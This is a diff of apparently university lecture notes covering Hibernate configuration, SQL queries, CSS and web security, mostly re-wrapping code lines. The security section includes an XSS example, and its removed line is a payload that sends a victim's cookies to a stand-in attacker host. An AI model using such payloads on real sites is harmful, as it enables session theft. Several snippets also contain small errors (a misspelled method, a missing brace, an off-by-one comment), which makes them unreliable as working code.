@@ -618,40 +618,73 @@ independent set of columns (or a basis for the data you want!).
 In this class we'll use the [Hibernate] object relational mapping, which is an
 ORM framework that uses annotations and a config file `hibernate.cfg.xml` to
 support the connection between Java objects and persistent storage. Here's an
-annotated example of CoffeeMaker's `hibernate.cfg.xml`.
+annotated and simplified example from CoffeeMaker's `hibernate.cfg.xml`.
+
+The `SHORTENED` link is:
+<http://www.hibernate.org/dtd/hibernate‐configuration‐3.0.dtd>.
+It is too large to fit attractively.
 
 ```xml
 <?xml version="1.0" encoding="utf‐8"?>
-<!DOCTYPE hibernate‐configuration SYSTEM "http://www.hibernate.org/dtd/hibernate‐configuration‐3.0.dtd">
+<!DOCTYPE hibernate‐configuration SYSTEM
+  "SHORTENED">
 <hibernate‐configuration>
   <session‐factory>
-    <!-- Specifies the Hibernate dialect for the version of MySQL -->
-    <property name="hibernate.dialect">org.hibernate.dialect.MySQL5Dialect</property>
     <!--
-    Drop and re‐create the database schema on startup, useful because
-    CoffeeMaker is a toy.
+    Specifies the Hibernate dialect for the
+    version of MySQL
     -->
-    <property name="hibernate.hbm2ddl.auto">create</property>
+    <property name="hibernate.dialect">
+      org.hibernate.dialect.MySQL5Dialect
+    </property>
     <!--
-    Connection properties, specifies the DB Drive (JDBC) and connection URL.
+    Drop and re‐create the database schema on
+    startup, useful because CoffeeMaker is a
+    toy.
     -->
-    <property name="hibernate.connection.driver_class">com.mysql.jdbc.Driver</property>
-    <property name="hibernate.connection.url"> jdbc:mysql://localhost/coffeemaker?createDatabaseIfNotExist=true&amp;allowPublicKeyRetrieval=true</property>
+    <property name="hibernate.hbm2ddl.auto">
+      create
+    </property>
+    <!--
+    Connection properties, specifies the DB
+    Drive (JDBC) and connection URL.
+    -->
+    <property
+      name="hibernate.connection.driver_class">
+      com.mysql.jdbc.Driver
+    </property>
+    <property name="hibernate.connection.url">
+      jdbc:mysql://localhost/coffeemaker
+    </property>
 
     <!--
-    Ideally you'd create a user with minimal privileges and a strong password
-    for security.
+    Ideally you'd create a user with minimal
+    privileges and a strong password for
+    security.
     -->
-    <property name="hibernate.connection.username">root</property>
-    <property name="hibernate.connection.password"></property>
-    <!-- JDBC connection pool (use the built‐in), and size. -->
-    <property name="hibernate.connection.pool_size">10</property>
+    <property
+      name="hibernate.connection.username">
+      root
+    </property>
+    <property
+      name="hibernate.connection.password">
+    </property>
+    <!--
+    JDBC connection pool (use the built‐in), and
+    size.
+    -->
+    <property
+      name="hibernate.connection.pool_size">
+      10
+    </property>
     <!-- Echo all executed SQL to stdout -->
     <property name="show_sql">true</property>
 
     <!-- List of persistent classes -->
-    <mapping class="edu.ncsu.csc.coffee_maker.models.persistent.Recipe" />
-    <mapping class="edu.ncsu.csc.coffee_maker.models.persistent.Inventory" />
+    <mapping
+      class="coffee_maker.models.Recipe" />
+    <mapping
+      class="coffee_maker.models.Inventory" />
   </session‐factory>
 </hibernate‐configuration>
 ```
@@ -662,16 +695,20 @@ Here is an annotated example of a plain Java class that uses Hibernate
 @Entity
 @Table(name = "recipes")
 public class Recipe {
-  // The columns in the database.
-  // primitives don't *need* to be boxed into their Object form. But `null`
-  // means that something doesn't exist, which is different from the zero value
-  // of the primitive. However, if you guarantee that the column always have a
+  // The columns in the database. Primitives
+  // don't *need* to be boxed into their Object
+  // form. But `null` means that something
+  // doesn't exist, which is different from the
+  // zero value of the primitive. However, if
+  // you guarantee that the column always have a
   // value then you can use the primitive.
 
   @Override
   @Id
   @GeneratedValue(generator = "increment")
-  @GenericGenerator(name = "increment", strategy = "increment")
+  @GenericGenerator(
+    name = "increment",
+    strategy = "increment")
   private Long id;
   @NotNull
   private String name;
@@ -682,8 +719,10 @@ public class Recipe {
   @Min(0)
   private Integer milk;
 
-  // Mark this as the primary key that is auto-incremented by 1 with each
-  // insert. The primary key must be unique and is fast to look up by.
+  // Mark this as the primary key that is
+  // auto-incremented by 1 with each insert. The
+  // primary key must be unique and is fast to
+  // look up by.
   public Long getId()
     return id;
   }
@@ -701,12 +740,17 @@ service by leaking connections. Sadly, `Session` does not implement
 
 ```java
 public void save() {
-  final Session session = HibernateUtil.getSessionFactory().openSession();
-  // Wrap the operation(s) in a transaction to make them atomic
+  final Session session =
+    sessionFactory.openSession();
+  // Wrap the operation(s) in a transaction to
+  // make them atomic. Ideally you'd use a
+  // try-with-resources block, but the example
+  // in class didn't use that.
   session.beginTransaction();
   // CRUD operation
   session.saveOfUpdate(this);
-  // Commit the transaction, actually making the changes.
+  // Commit the transaction, actually making the
+  // changes.
   session.getTransaction().commit();
   // Close the session!!
   session.close();
@@ -751,7 +795,8 @@ database, make a table in it, and add some rows.
 ```mysql
 -- Create a database called coffeemaker
 CREATE SCHEMA coffeemaker;
--- Start "using" the database, basically cd in it. (This is a MySQL thing.)
+-- Start "using" the database, basically cd in
+-- it. (This is a MySQL thing.)
 USE coffeemaker;
 
 -- Create a table with the following fields
@@ -763,13 +808,18 @@ CREATE TABLE recipes (
   coffee INT,
   milk INT,
   chocolate INT,
-  -- Specify the primary key. This is the thing that is fastest to look up by
-  -- and must be unique for each row.
+  -- Specify the primary key. This is the thing
+  -- that is fastest to look up by and must be
+  -- unique for each row.
   PRIMARY KEY (id)
 );
 
 -- Add a row into the 'recipes' table.
-INSERT INTO recipes (name, price, coffee, milk, sugar, chocolate) VALUES ('Coffee', 50, 1, 1, 1, 0);
+INSERT INTO recipes
+(name, price, coffee, milk, sugar, chocolate)
+VALUES
+('Coffee', 50, 1, 1, 1, 0)
+;
 
 -- Select all the recipes and show them
 SELECT * FROM recipes;
@@ -779,7 +829,8 @@ Let's look a little more at those `SELECT` statements. `SELECT` statements are
 how you extract data from a database. They have the general form of
 
 ```mysql
-SELECT <columns> FROM <tables> WHERE <conditions>
+SELECT <cols> FROM <tables>
+WHERE <conditions>;
 ```
 
 Some of the simplest types of queries are where you select multiple columns and
@@ -789,14 +840,17 @@ filter by different columns. Here's annotated examples.
 -- Select every column from the recipes table.
 SELECT * FROM recipes;
 
--- Select the name column from the recipes table.
+-- Select the name column from the recipes
+-- table.
 SELECT name FROM recipes;
 
 -- Select the recipe name with an id of 1.
 SELECT name FROM recipes WHERE id = 1;
 
--- Select recipes with at least one unit of coffee and one unit of milk.
-SELECT * FROM recipes WHERE coffee > 1 AND milk > 1;
+-- Select recipes with at least one unit of
+-- coffee and one unit of milk.
+SELECT * FROM recipes
+WHERE coffee > 1 AND milk > 1;
 ```
 
 As you can see above, `*` is the wildcard (matches everything). For
@@ -810,11 +864,19 @@ We can do more advanced queries by doing filtering, sorting, and aggregation.
 SELECT DISTINCT <columns> FROM <table>;
 
 -- Sort the columns by the <orderby columns>
-SELECT <columns> FROM <table> WHERE <conditions> ORDER BY <orderby columns>;
+SELECT <columns> FROM <table>
+WHERE <conditions>
+ORDER BY <orderby columns>
+;
 
--- Aggregate all columns by the groupby column and count the number of matches
--- in that group.
-SELECT <columns>, COUNT(<groupby column>) FROM <table> WHERE <conditions> GROUP BY <groupby column>;
+-- Aggregate all columns by the groupby column
+-- and count the number of matches in that
+-- group.
+SELECT <columns>, COUNT(<groupby column>)
+FROM <table>
+WHERE <conditions>
+GROUP BY <groupby column>
+;
 ```
 
 ## Using Persistent Objects
@@ -866,10 +928,11 @@ CREATE TABLE transactions (
   paid INT,
   -- id is OUR primary key
   PRIMARY KEY (id),
-  -- Create a column called purchase which is a foreign key referencing the
-  -- recipes.id column.
-  -- If this foreign key references the same key in multiple different tables
-  -- we can list them out after `REFERENCES`
+  -- Create a column called purchase which is a
+  -- foreign key referencing the recipes.id
+  -- column. If this foreign key references the
+  -- same key in multiple different tables we
+  -- can list them out after `REFERENCES`
   FOREIGN KEY (purchase) REFERENCES recipes(id)
 );
 ```
@@ -929,9 +992,15 @@ but the recipe is identical.
 
 ```mysql
 SELECT *
-FROM transactions AS t, transactions_recipes AS tr, recipes AS r
-WHERE t.id = tr.transaction_id AND r.id = tr.recipe_id
--- t.id is higher priority for sorting than r.id
+FROM
+  transactions AS t,
+  transactions_recipes AS tr,
+  recipes AS r
+WHERE
+  -- t.id is higher priority for sorting than
+  -- r.id
+  t.id = tr.transaction_id 
+  AND r.id = tr.recipe_id
 ORDER BY t.id, r.id
 ;
 ```
@@ -1006,12 +1075,18 @@ div {
   color: red;
 }
 
-/* This applies to any tag with class="class-selector" */
+/*
+  This applies to any tag with
+  class="class-selector"
+*/
 .class-selector {
   color: green;
 }
 
-/* This applies to any tag with id="id-selector" */
+/*
+  This applies to any tag with
+  id="id-selector"
+*/
 #id-selector {
   color: blue;
 }
@@ -1029,7 +1104,9 @@ normal specificity rules apply but only for `!important` elements. For example,
 in the example below the text is blue because `#id-selector` wins.
 
 ```html
-<div id="id-selector" class="class-selector">div text</div>
+<div id="id-selector" class="class-selector">
+  div text
+</div>
 ```
 
 CSS is called *cascading* because in the following example "span text" would be
@@ -1413,8 +1490,12 @@ because the binary format ensures that strings and other variables are
 interpreted appropriately.
 
 ```sql
--- This query has 2 parameters, one for name and one for price.
-INSERT INTO products (name, price) VALUES (?, ?);
+-- This query has 2 parameters, one for name and
+-- one for price.
+INSERT INTO products
+(name, price)
+VALUES
+(?, ?);
 ```
 
 **Explicitly validate ALL data.** Validate multiple levels and *especially*
@@ -1456,13 +1537,18 @@ some malware onto the client which just loaded the page. Here is an example of
 a XSS vulnerability.
 
 ```java
-page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
+page += String.format(
+  "<input name='creditcard' type='TEXT' "
+    + "value='%s'>",
+  request.getParameter("CC"));
 ```
 
 This could insert.
 
 ```
-'><script>document.location='http://www.attacker.com/cgi-bin/cooki.cgi?foo='+document.cookie<script'
+'><script>
+  document.location='http://attacker.com/'
+<script'
 ```
 
 ## Threat Modeling
